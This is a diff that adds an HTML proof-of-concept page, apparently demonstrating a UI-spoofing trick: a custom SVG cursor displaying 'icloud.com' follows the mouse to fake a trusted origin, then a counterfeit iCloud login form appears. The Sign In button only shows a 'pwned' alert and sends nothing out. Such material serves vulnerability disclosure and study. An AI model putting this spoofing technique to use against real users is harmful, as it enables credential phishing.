@@ -1,0 +1,99 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Spoof</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }
+
+    .hover-box {
+      margin-top: 10px;
+      padding: 15px 40px;
+      background-color: #f0f0f0;
+      border: 1px solid #ccc;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div id=main class="hover-box" onclick=email.focus();>Login to iCloud</div>
+
+<center><h1 id=h style="display:none; position: absolute; top: 35%; left: 50%; transform: translate(-50%, -50%);">
+<div class="input-group">
+            <span class="icon">📧</span>
+            <input type="email" id="email" placeholder="Email" autofocus>
+        </div>
+        <div class="input-group">
+            <span class="icon">🔒</span>
+            <input type="password" id="password" placeholder="Password">
+        </div>
+        <button class="button" onclick="alert('pwned :)')">Sign In</button></center>
+
+  <script>
+
+
+    function createCursor(text) {
+  const width = 128;
+  const height = 128;
+  const boxHeight = 15;
+  const boxY = 15;
+
+  const svg = `
+    <svg xmlns="http://www.w3.org/2000/svg" width="${width}" height="${height}">
+      <rect x="0" y="${boxY}" width="${width}" height="${boxHeight}" fill="rgba(55,56,55,255)"/>
+      <text x="50%" y="${boxY + boxHeight / 2}" 
+            dominant-baseline="middle" 
+            text-anchor="middle" 
+            fill="white"
+            font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif"
+            font-size="10">
+        ${text}
+      </text>
+    </svg>
+  `;
+
+  // Convert the SVG string to a data URI
+  return 'data:image/svg+xml;base64,' + btoa(unescape(encodeURIComponent(svg)));
+}
+
+
+    const customCursor = createCursor("icloud.com");
+    const box = document.querySelector('.hover-box');
+
+box.addEventListener('mousemove', (e) => {
+
+
+if(check){
+main.innerHTML=`Click to Login`;
+email.focus();
+h.style.display='block';
+
+check=false;
+}
+
+  const centerX = window.innerWidth / 2;
+  const centerY = 0;
+
+  const offsetX = Math.max(0, Math.min(127, 128 - 64 - Math.round(centerX - e.clientX)));
+  const offsetY = Math.max(0, Math.min(127,  25 - Math.round(centerY - e.clientY)));
+
+  box.style.cursor = `url(${customCursor}) ${offsetX} ${offsetY}, auto`;
+});
+
+
+    box.addEventListener('mouseleave', () => {
+      box.style.cursor = 'default';
+    });
+
+var check=1;
+  </script>
+</body>
+</html>
